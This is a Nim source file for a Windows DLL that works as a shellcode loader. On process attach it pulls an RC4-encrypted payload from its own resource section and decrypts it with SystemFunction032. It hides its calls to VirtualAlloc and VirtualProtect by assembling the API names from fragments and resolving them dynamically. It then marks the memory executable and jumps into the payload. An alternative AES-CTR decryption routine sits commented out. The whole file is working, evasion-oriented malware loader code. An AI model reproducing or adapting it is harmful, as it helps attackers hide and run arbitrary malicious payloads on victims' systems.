import winim
import nimcrypto
import includes/DLoader
import includes/rc4

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

when defined(gcc) and defined(windows):
  {.link: "resource.o"}

# const encContent = slurp("encContent.bin")

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Same Key
var keyBuf: array[7, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var VirtAl = ""
VirtAl.add("Vi")
VirtAl.add("rt")
VirtAl.add("ua")
VirtAl.add("lA")
VirtAl.add("ll")
VirtAl.add("oc")

var VirtPr = ""
VirtPr.add("Vi")
VirtPr.add("rt")
VirtPr.add("ua")
VirtPr.add("lP")
VirtPr.add("ro")
VirtPr.add("te")
VirtPr.add("ct")

type
    VirtualAlloc_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall.} 
    VirtualProtect_t* = proc(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): WINBOOL {.stdcall.}

var VirtualAlloc_p*: VirtualAlloc_t

var VirtualProtect_p*: VirtualProtect_t
var k32Addr: HANDLE = get_library_address() 

VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))

#let shellcode: seq[byte] = 
# let shellcode: seq[byte] = encContent.toByteSeq

var resourceId = 3
var resourceType = 10

# Get pointer to encrypted shellcode in .rsrc section
var myResource: HRSRC = FindResource(cast[HMODULE](NULL), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))

var myResourceSize: DWORD = SizeofResource(cast[HMODULE](NULL), myResource)

var hResource: HGLOBAL = LoadResource(cast[HMODULE](NULL), myResource)

var shellcode = LockResource(hResource)

proc NimMain() {.cdecl, importc.}

proc execute(): void =
    #let shellcode: seq[byte] = encContent.toByteSeq

    # AES Decrypt - Working
    #[let iv = "BLANK_IV"
    let passwd = """BLANK_PASSWORD"""

    var dctx: CTR[aes256]

    var decShellcode = newSeq[byte](len(shellcode))
    let decodedIV = fromHex(iv)

    var expandedkey = sha256.digest(passwd)
    dctx.init(expandedkey.data, decodedIV)
    dctx.decrypt(shellcode, decShellcode)
    dctx.clear()
    ]#

    var oldProtect: DWORD

    let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
    copyMem(buffer, shellcode, myResourceSize)

    imgString.Buffer = buffer
    imgString.Length = myResourceSize
    imgString.MaximumLength = myResourceSize

    SystemFunction032(addr imgString, addr keyString)
    
    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)

    #let tHandle = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
    #WaitForSingleObject(tHandle, INFINITE)
    # Works
    let f = cast[proc(){.nimcall.}](buffer)
    f()
    

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  if fdwReason == DLL_PROCESS_ATTACH:
    execute()

  return true
